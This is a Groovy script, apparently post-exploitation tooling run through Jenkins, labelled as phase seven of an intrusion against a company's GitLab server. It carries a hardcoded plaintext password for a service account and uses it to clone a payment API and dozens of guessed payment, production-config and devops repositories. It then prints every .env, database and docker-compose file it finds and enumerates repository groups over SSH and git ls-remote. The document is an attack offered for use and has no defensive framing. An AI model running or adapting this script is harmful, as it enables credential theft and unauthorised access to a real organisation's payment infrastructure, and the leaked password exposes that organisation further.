// PHASE 7: Clean - Read caja-pagos-api + aggressive repo enumeration
// Fix: path was different between phase 5 and 6

def user = "jenkins"
def pass = "e6LBqIkOI\$PR1XX2oia"
def passEnc = java.net.URLEncoder.encode(pass, "UTF-8")
def glBase = "https://gitlab.dev.claroshop.com"
def cloneBase = glBase.replace("https://", "https://${user}:${passEnc}@")
def DEST_BASE = "/tmp/glr_"

def gitClone = { repoPath ->
    def dest = DEST_BASE + repoPath.replace('/', '__')
    def f = new File(dest)
    if (f.exists() && f.isDirectory() && f.list()?.length > 2) {
        return [success: true, dest: dest, files: f.list()]
    }
    try { ["bash","-c","rm -rf '${dest}'"].execute().waitFor() } catch(e) {}
    def cloneUrl = "${cloneBase}/${repoPath}.git"
    def proc = ["bash","-c","GIT_TERMINAL_PROMPT=0 GIT_SSL_NO_VERIFY=1 git clone --depth=1 '${cloneUrl}' '${dest}' 2>&1"].execute()
    proc.waitForOrKill(30000)
    def f2 = new File(dest)
    def ok = f2.exists() && f2.isDirectory() && f2.list()?.length > 1
    return [success: ok, dest: dest, files: f2.list(), err: proc.text?.take(150)]
}

// Read all .env and config files
def readConfigs = { destDir ->
    def f = new File(destDir)
    if (!f.exists() || !f.isDirectory()) return [:]
    def results = [:]
    try {
        f.eachFileRecurse { file ->
            if (!file.isFile()) return
            def name = file.name
            def path = file.absolutePath.replace(destDir, "")
            // Skip binary/git/vendor
            if (path.contains("/.git/") || path.contains("/vendor/") || 
                path.contains("/node_modules/") || file.length() > 200000) return
            def isConfig = name in [".env", ".env.local", ".env.production", ".env.prod",
                                     "local.php", "database.php", "database.yml",
                                     "docker-compose.yml", ".env.example"] ||
                           (name == "config.php" && path.contains("/config")) ||
                           name.endsWith(".env")
            if (isConfig) {
                try { results[path] = file.text.take(6000) } catch(e) {}
            }
        }
    } catch(ex) { results["_error"] = ex.message?.take(100) }
    return results
}

// ===== PART 1: Clone and read caja-pagos-api =====
println "=== PART 1: caja-pagos-api ==="
def r1 = gitClone("claroshop/caja-pagos-api")
println "  Clone: ${r1.success} files=${r1.files?.join(',')?.take(150)}"
if (r1.success) {
    def configs = readConfigs(r1.dest)
    if (configs) {
        configs.each { p, content ->
            println "\n  >>>>>> FILE: ${p}"
            println content
            println "  <<<<<< END"
        }
    } else {
        // Show all files
        println "  No .env/.php config files. Listing all:"
        new File(r1.dest).eachFileRecurse { ff ->
            if (!ff.absolutePath.contains("/.git/") && !ff.absolutePath.contains("/vendor/"))
                println "    ${ff.absolutePath.replace(r1.dest, '')}"
        }
    }
}

// ===== PART 2: Mass clone with guesses =====
println "\n=== PART 2: MASS CLONE ATTEMPT ==="
def allRepos = [
    // PAYMENT SYSTEMS
    "claroshop/caja-pagos-api", "claroshop/caja-api",
    "claroshop/payment-api", "claroshop/payment-service",
    "claroshop/payment-bank-api", "claroshop/payment-claropay",
    "claroshop/claropay-api", "claroshop/claropay",
    "claroshop/t1pagos-integration", "claroshop/t1-pagos",
    // SEARS
    "sears/sears-api", "sears/mesa-regalo-api",
    "sears/sears-backend", "sears/sears-microservices",
    "sears/payment-api", "sears/caja-api",
    // TIENDA / MONEDERO
    "claroshop/tienda", "claroshop/tienda-api",
    "claroshop/monedero", "claroshop/monedero-api",
    "claroshop/axii", "claroshop/axii-api",
    // MICROSERVICES
    "claroshop/ms-payment", "claroshop/ms-caja",
    "claroshop/ms-pedidos", "claroshop/ms-tarjetas",
    // PROD CONFIG
    "claroshop/config-prod", "claroshop/config",
    "ops/config-prod", "ops/configs",
    "claroshop/env-prod", "claroshop/production-configs",
    // INFRACODE
    "locales/Locales",
    "infracode/claroshop", "claroshop/infracode",
    // DEVOPS
    "devops/configs", "devops/prod-configs",
    "claroshop/docker-compose", "claroshop/deployment",
]

def successful = []
allRepos.each { repo ->
    def r = gitClone(repo)
    if (r.success) {
        println "  ✓ CLONED: ${repo}"
        successful << [repo: repo, dest: r.dest]
    }
}

println "\n  CLONED ${successful.size()} repos: ${successful*.repo.join(', ')}"

// ===== PART 3: Read configs from ALL cloned repos =====
println "\n=== PART 3: SENSITIVE FILES FROM CLONED REPOS ==="
successful.each { item ->
    if (item.repo == "claroshop/caja-pagos-api") return // already done in Part 1
    def configs = readConfigs(item.dest)
    if (configs) {
        println "\n  ===== ${item.repo} ====="
        configs.each { p, content ->
            println "  >> ${p}:"
            println content
            println "  <<"
        }
    } else {
        println "  ${item.repo}: No config files found. Files: ${new File(item.dest).list()?.join(', ')?.take(100)}"
    }
}

// ===== PART 4: Use git ls-remote to find group repos =====
println "\n=== PART 4: ENUMERATE GROUPS VIA SSH ==="
// Try SSH to find available repos
def sshOut = ["bash","-c","ssh -o StrictHostKeyChecking=no -o BatchMode=yes -T git@gitlab.dev.claroshop.com 2>&1"].execute().text?.take(200)
println "  SSH test: ${sshOut}"

// Check git ls-remote for known groups
["claroshop", "sears", "t1pagos", "ops", "devops", "infracode", "locales"].each { grp ->
    def r = ["bash","-c","GIT_TERMINAL_PROMPT=0 GIT_SSL_NO_VERIFY=1 git -c credential.helper='' ls-remote 'https://jenkins:${pass}@gitlab.dev.claroshop.com/${grp}' 2>&1"].execute().text?.take(200)
    println "  GROUP ${grp}: ${r?.trim()?.take(100)}"
}

println "\n=== DONE PHASE 7 ==="
